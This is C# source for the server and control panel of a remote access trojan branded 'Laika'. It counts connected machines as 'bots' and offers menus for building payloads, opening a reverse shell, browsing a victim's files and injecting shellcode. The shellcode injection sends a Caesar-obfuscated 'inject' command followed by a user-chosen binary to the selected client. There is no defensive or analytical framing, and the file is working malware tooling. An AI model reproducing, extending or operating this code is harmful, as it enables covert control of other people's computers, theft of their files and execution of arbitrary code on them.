using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace Server
{
    public partial class Menu : Form
    {
        public Menu()
        {
            InitializeComponent();
        }

        public static TcpListener server;
        public static int CLIENT_ID;
        public static List<TcpClient> CONNECT_CLIENTS = new List<TcpClient>();
        public static void ServerStart()
        {
            string localIPAddress = "192.168.56.1";//Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString();
            int port = 4444;
            server = new TcpListener(System.Net.IPAddress.Parse(localIPAddress), port);
            server.Start();
        }
        public static void ServerStop()
        {
            server.Stop();
        }
        public void on_new_client()
        {
            while (true)
            {
                TcpClient client;
                try
                {
                    client = server.AcceptTcpClient();
                }
                catch
                {
                    continue;
                }
                client.Client.Blocking = false;
                for (int i = 0; i < dataGridView1.Rows.Count; i++)
                {
                    if (dataGridView1.Rows[i].Cells[1].Value.ToString() == client.Client.RemoteEndPoint.ToString().Split(':')[0])
                    {
                        client.Close();
                        client = null;
                    }
                }
                if (client == null)
                    continue;
                this.Invoke((MethodInvoker)delegate
                {
                    dataGridView1.Rows.Add(new object[] { CONNECT_CLIENTS.Count, client.Client.RemoteEndPoint.ToString().Split(':')[0]});
                    dataGridView1.Update();
                });
                lock (CONNECT_CLIENTS)
                {
                    CONNECT_CLIENTS.Add(client);
                }
                try
                {
                    this.Text = "Laika - Server | " + CONNECT_CLIENTS.Count.ToString() + " bots";
                }
                catch { }
                Console.WriteLine("New client connected");
            }
        }
        public void on_close_socket()
        {
            while (true)
            {
                lock (CONNECT_CLIENTS)
                {
                    for (int i = 0; i < CONNECT_CLIENTS.Count; i++)
                    {
                        TcpClient client = CONNECT_CLIENTS[i];
                        if (i == FileExplorer.CLIENT_ID)
                            continue;
                        try
                        {
                            if (client.Client.Poll(1, SelectMode.SelectRead) && client.Client.Available == 0)
                            {
                                CONNECT_CLIENTS.RemoveAt(i);

                                this.Invoke((MethodInvoker)delegate
                                {
                                    dataGridView1.Rows.RemoveAt(i);
                                    dataGridView1.Update();
                                });

                                i--;
                                try
                                {
                                    this.Text = "Laika - Server | " + CONNECT_CLIENTS.Count.ToString() + " bots";
                                }
                                catch { }
                                Console.WriteLine("Client disconnected");
                            }
                        }
                        catch (SocketException)
                        {
                            CONNECT_CLIENTS.RemoveAt(i);

                            this.Invoke((MethodInvoker)delegate
                            {
                                dataGridView1.Rows.RemoveAt(i);
                                dataGridView1.Update();
                            });

                            i--;
                            try
                            {
                                this.Text = "Laika - Server | " + CONNECT_CLIENTS.Count.ToString() + " bots";
                            }
                            catch { }
                        }
                    }
                }
                Thread.Sleep(100);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            dataGridView1.ClearSelection();
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void BuildPayloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BuildMenu menu = new BuildMenu();

            menu.Show(this);
        }

        private void StartPatateCrypterToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.RowIndex >= 0 && e.ColumnIndex >= 0)
            {
                dataGridView1.CurrentCell = dataGridView1.Rows[e.RowIndex].Cells[e.ColumnIndex];
                CLIENT_ID = dataGridView1.CurrentRow.Index;

                contextMenuStrip1.Show(Cursor.Position);
            }
        }
        private void ReverseShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (FileExplorer.OPENED == false)
                Shell.StartShell();
        }

        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Shell.OPENED == false)
            {
                FileExplorer fex = new FileExplorer();

                fex.Show(this);
            }
        }

        private void ExecuteShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Binary files (*.bin)|*.bin",
                Title = "Select your shellcode"
            };

            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;

            string filePath = openFileDialog.FileName;
            TcpClient c = CONNECT_CLIENTS[dataGridView1.CurrentRow.Index];
            c.ReceiveTimeout = 10000;
            c.Client.Blocking = true;

            try
            {
                NetworkStream stream = c.GetStream();

                byte[] Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("inject"));
                stream.Write(Message, 0, Message.Length);
                Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("32"));
                stream.Write(Message, 0, Message.Length);

                byte[] fileContent = File.ReadAllBytes(filePath);
                stream.Write(fileContent, 0, fileContent.Length);

                byte[] buffer = new byte[5];
                int bytesRead;

                bytesRead = stream.Read(buffer, 0, buffer.Length);
                string receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
                MessageBox.Show(receivedData);
            }
            catch
            {
                MessageBox.Show("Client timed out.");
            }

            c.Client.Blocking = false;
        }
    }
}
